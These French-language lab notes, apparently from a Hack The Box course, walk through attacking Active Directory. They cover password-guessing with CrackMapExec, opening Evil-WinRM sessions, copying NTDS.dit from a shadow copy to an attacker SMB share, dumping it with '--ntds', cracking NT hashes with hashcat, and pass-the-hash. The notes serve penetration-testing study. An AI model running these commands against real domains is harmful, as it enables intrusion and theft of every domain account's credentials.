# Attaque de l'active Directory & NTDS.dit

Les notes dans cette page concerne principalement la façon dont nous pouvons extraire les informations d'identification en utilisant une attaque par dictionnaire contre les comptes AD et en vidant les hachages du fichier NTDS.dit.

On considère que la cible doit être accessible sur le réseau, et qu'on ait un foothold établi dans le réseau interne.
Avant de voir l'attaque, rappelons le processus d'authentification une fois qu'un système Windows a rejoint un domaine afin de mieux comprendre l'intérêt de l'activite directory dans cette attaque.

### Mise en contexte
Une fois qu'un  système Windows rejoint un domaine, il ne fera plus référence par défault à la Base de données SAM pour faire des authentifications.
Le système Windows ayant rejoint le domaine transmettra toutes les requêtes d'authentification au domain controller.

Quelqu'un voulant s'authentifier à partir d'un compte local dans le SAM pourra le faire en spécifiant le nom de l'hôte du matériel avant le nom d'utilisateur (example **WS01:Username**), ou en ayant directement accès à l'appareil et en tapant **./** dans l'UI de login dans le champ **Utilisateur**.

## Attaques par dictionnaire contre des comptes AD à l'aide de CrackMapExec
L'idée est de se confectionner un dictionnaire à partir des noms d'employés trouvés sur les réseaux sociaux et du domaine de l'entreprise que l'on vise et qui est facilement disponible sur google.
Les conventions sont souvent les mêmes, du style "nom.prenom, n.prenom, etc".

Il existe des outils comme [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) pour confectionner des listes de pseudos à partir d'une liste de nom / prénom.


```console
Misoko@htb[/htb]$ ./username-anarchy -i /home/names.txt 
```

## Lancer l'attaque avec CrackMapExec
Voici des conventions communes pour faire des listes pour une attaque par dictionnaire:
| Username Convention               | Practical Example for Jane Jill Doe |
|-----------------------------------|-------------------------------------|
| firstinitiallastname              | jdoe                                |
| firstinitialmiddleinitiallastname | jjdoe                               |
| firstnamelastname                 | janedoe                             |
| firstname.lastname                | jane.doe                            |
| lastname.firstname                | doe.jane                            |
| nickname                          | doedoehacksstuff                    |

Une fois la liste confectionnée, nous pouvons lancer notre attaque contre le contrôleur de domaine cible en utilisant un outil tel que CrackMapExec. Nous pouvons l'utiliser en conjonction avec le protocole SMB pour envoyer des demandes de connexion au contrôleur de domaine cible.
```console
Misoko@htb[/htb]$ crackmapexec smb 10.129.201.57 -u jDoe -p /usr/share/wordlists/fasttrack.txt
```
Dans l'exemple précédent, on essaye de se connection en tant qu'utilisateur **-u jDoe** avec la liste de mots de passes **usr/share/wordlists/fasttrack.txt**.

Il est possible en fonction de la politique de blocage de comptes que notre attaque provoque le blocage de l'utilisateur en question.
Par défaut, ce genre de politique n'est pas mis en place au moment de ces notes (février 2023).

## Logs provenant de l'attaque
Il peut être intéréssant pour la cible de savoir où se trouvent les traces de l'attaque afin de renforcer les politiques de sécurité.
<img src="../images/eventLogPanel.png " alt= “” width="700" height="350"/>

Sur n'importe quel système d'exploitation Windows, un administrateur peut naviguer dans l'Observateur d'événements **(Event Viewer)** et afficher les événements de sécurité pour voir les actions exactes qui ont été enregistrées.
## Capturer NTDS.dit
NT Directory Services (NTDS) est un service d'annuaire utilisé en tant que composant de l'AD, ayant la responsablité de trouver et organiser les ressources réseaux.
On rapelle que **NTDS.dit** est stocké dans **%systemroot$/ntds** sur les controleurs de domaine d'une forêt. Le **.dit** signifie [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).

Il s'agit du **principal fichier de base de données associé à AD et il stocke tous les noms d'utilisateur de domaine, les hachages de mots de passe et d'autres informations essentielles du schéma.**
Si ce fichier peut être capturé, nous pouvons potentiellement compromettre tous les comptes du domaine, à l'instar de la technique d'attaque de SAM vu auparavant.

### Connection à un controleur de domaine (DC) avec Evil-WinRM
```console
Misoko@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
Evil-WinRM se connecte à une cible en utilisant le service de gestion à distance de Windows **(WinRM)** combiné au protocole PowerShell Remoting pour établir une session PowerShell avec la cible.

### Vérification de l'appartenance à un groupe local
Une fois connecter, on peut voir quel privilège prossède l'utilisateur de la session **(bwilliamson)** ici.
### Appartenance au groupe local
```console
*Evil-WinRM* PS C:\> net localgroup
```
Le but est de regarder si le compte possède des droits d'admin locaux afin de voir le fichier **NTDS.dt**. On a besoin des droits d'admin locaux **(Administrators group)** ou d'admin du domaine **(Domain Admin group)**.

### Vérification des privilèges des comptes utilisateurs dans le domaine
```console
*Evil-WinRM* PS C:\> net user bwilliamson
```

### Création d'une Shadow copie de C:
On peut utiliser **vssadmin** pour créé un VSS **(Volume Shadow Copy)** de C: ou de toute autre volume de disque choisis par l'admin pour l'installation de l'AD.
Par défaut, NTDS est installé sur le C: mais l'admin a pu choisir autrement.
On utilise VSS car il a été désigné pour la copie de volumes sans avoir forcémment besoin d'interrompre des applications / systèmes.

```console
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

### Copier NTDS.dit à partir du VSS

Nous pouvons copier le fichier NTDS.dit de la copie d'ombre du volume de C : vers un autre emplacement sur le disque pour nous préparer à déplacer NTDS.dit vers notre hôte d'attaque.

```console
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Avec **\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2** le nom du volume de la copie shadow.

### Transfert de NTDS.dit vers l'hôte d'attaque
Nous pouvons utiliser **cmd.exe /c move** pour déplacer le fichier depuis le domaine controller cible vers l'hôte d'attaque.

```console
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\Misoko 
```
En sachant que sur l'hôte d'attaque, on a un serveur smb qui recevra le fichier.


### Méthode plus rapide : Utilisation cme pour capturer NTDS.dit

Une autre alternative réside dans le fait d'utiliser **CrackMapExec** pour accomplir toutes les étapes précédentes avec une seule commande. Cette commande va utiliser VSS pour capturer et dump rapidement le contenu du fichier **NTDS.dit**.

```console
Misoko@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Cracker les Hashees et Obtenir les Credentials

Nous pouvons mettre tous les hashes NT dans un fichier ou les cracker individuellement avec Hashcat.

```console
Misoko@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Attaque "Pass the hash"
Quand on arrive à craquer le hash pour obtenir les identifiants, on peut facilement continuer notre chemin.
Cependant quand ce n'est pas le cas, il existe une attaque intitulé **"Pass the Hash" (PtH)**.
L'attaque **Pth** profite du **protocole d'authentification NTLM**, qui permet d'authentificer un utilisateur à partir d'un hash plutôt qu'un mot de passe en clair. On peut ainsi opérer de la sorte avec **Evil-WinRM.**
C'est une technique très utilisée pour faire du mouvement latéral une fois la compromision initiale faite.
```console
Misoko@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
